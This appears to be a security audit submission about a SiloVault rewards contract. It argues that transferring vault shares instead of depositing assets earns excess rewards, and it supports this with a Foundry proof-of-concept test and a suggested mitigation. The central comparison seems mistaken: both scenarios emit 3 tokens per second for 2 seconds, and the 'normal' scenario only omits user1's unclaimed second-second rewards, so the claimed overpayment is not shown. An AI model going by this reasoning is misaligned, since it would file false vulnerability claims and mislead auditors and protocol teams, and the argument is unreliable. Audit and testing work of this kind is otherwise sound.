# Title *
user can gain excessive rewards by transferring shares instead of depositing assets

# Links to affected code *


# Vulnerability details *
## Finding description and impact
In `SiloVault`, users typically receive rewards based on the amount of assets they deposit. However, since `SiloVault` inherits from `ERC4626`, it supports transferring shares directly via `transfer`. A user can receive shares from another user through a transfer, and still accumulate rewards — even though they didn’t actually deposit any assets themselves.

This can lead to users who receive shares via transfer earning more rewards than they should. That’s because the protocol treats transferred shares the same as deposited ones when calculating rewards — even though no new assets were actually added. This creates an unfair advantage and leads to the protocol overpaying rewards. Users can game the system by reusing existing assets without adding new ones, which not only wastes incentives but also makes the asset pool less healthy over time.

## Proof of Concept
Here’s a comparison of two cases:

Scenario 1: Normal deposit flow
- User1 deposits 1 unit of asset
- After 1 second, User1 gets 3 units of reward
- User2 deposits 1 unit of asset
- After 1 second, User2 gets 1 unit of reward
- **Total deposited assets: 2, total accumulated staking time: 2 seconds, total rewards distributed: 4**


Scenario 2: Transfer abuse
- User1 deposits 1 unit of asset
- After 1 second, User1 gets 3 units of reward
- User1 transfers their shares to User2 (User2 didn’t deposit anything)
- After another second, User2 gets 3 units of reward
- **Total deposited assets: 1, total accumulated staking time: 2 seconds, total rewards distributed: 6**

This shows that transferring shares causes the system to miscalculate rewards — users put in fewer actual assets, yet still earn more tokens over the same amount of time.

Write the `PoC` contract below to `VaultsSiloIncentivesTest` contract in `test/foundry/incentives/VaultsSiloIncentives.i.sol`, It includes two test cases representing the scenarios described above. Run the test with command `FOUNDRY_PROFILE=vaults-with-tests forge test --mc PoC --ffi  -v`.

```solidity
contract PoC is IntegrationTest {

    MintableToken reward1 = new MintableToken(18);

    SiloIncentivesController vaultIncentivesController;
    IVaultIncentivesModule vaultIncentivesModule;

    uint256 rewardsPerSec = 3;
    uint256 depositAmount = 1;

    address user1;
    address user2;

    uint256 user1_reward;
    uint256 user2_reward;

    function setUp() public override {
        super.setUp();

        vaultIncentivesModule = vault.INCENTIVES_MODULE();
        assertTrue(address(vaultIncentivesModule) != address(0), "empty vaultIncentivesModule");

        _setCap(allMarkets[0], CAP);
        _setCap(allMarkets[1], CAP);
        _setCap(allMarkets[2], CAP);

        reward1.setOnDemand(true);

        vaultIncentivesController = new SiloIncentivesController(address(this), address(vault));

        // standard program for vault users
        vaultIncentivesController.createIncentivesProgram(
            DistributionTypes.IncentivesProgramCreationInput({
                name: "x",
                rewardToken: address(reward1),
                emissionPerSecond: uint104(rewardsPerSec),
                distributionEnd: uint40(block.timestamp + 10)
            })
        );
        vm.prank(OWNER);
        vaultIncentivesModule.addNotificationReceiver(INotificationReceiver(address(vaultIncentivesController)));

        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
    }

    // Scenario 1: Normal deposit flow
    function test_vaults_incentives_deposit() public {
        // user1 deposit 1
        vm.prank(user1);
        vault.deposit(1, user1);

        // wait 1s
        vm.warp(block.timestamp + 1);

        // user1 claim
        vm.prank(user1);
        vaultIncentivesController.claimRewards(user1);
        user1_reward = reward1.balanceOf(user1);
        assertEq(user1_reward, 3);

        // user2 deposit 1
        vm.prank(user2);
        vault.deposit(1, user2);

        // wait 1s
        vm.warp(block.timestamp + 1);

        // user2 claim
        vm.prank(user2);
        vaultIncentivesController.claimRewards(user2);
        user2_reward = reward1.balanceOf(user2);
        assertEq(user2_reward, 1);

        // total = user1_reward + user2_reward = 4
        assertEq(user1_reward + user2_reward, 4);
    }

    // Scenario 2: Transfer abuse
    function test_vaults_incentives_transfer() public {
        // user1 deposit 1
        vm.prank(user1);
        vault.deposit(1, user1);

        // wait 1s
        vm.warp(block.timestamp + 1);

        // user1 claim
        vm.prank(user1);
        vaultIncentivesController.claimRewards(user1);
        user1_reward = reward1.balanceOf(user1);
        assertEq(user1_reward, 3);

        uint256 user1_shares = vault.balanceOf(user1);

        // user1 transfer shares to user2
        vm.prank(user1);
        vault.transfer(user2, user1_shares);

        // wait 1s
        vm.warp(block.timestamp + 1);

        // user2 claim
        vm.prank(user2);
        vaultIncentivesController.claimRewards(user2);
        user2_reward = reward1.balanceOf(user2);
        assertEq(user2_reward, 3);

        // total  = user1_reward + user2_reward = 6
        assertEq(user1_reward + user2_reward , 6);
    }
}
```

## Recommended mitigation steps
Consider adding a mechanism to distinguish between deposited and transferred shares, limiting rewards to actual deposits, or disabling `transfer` and `transferFrom` altogether.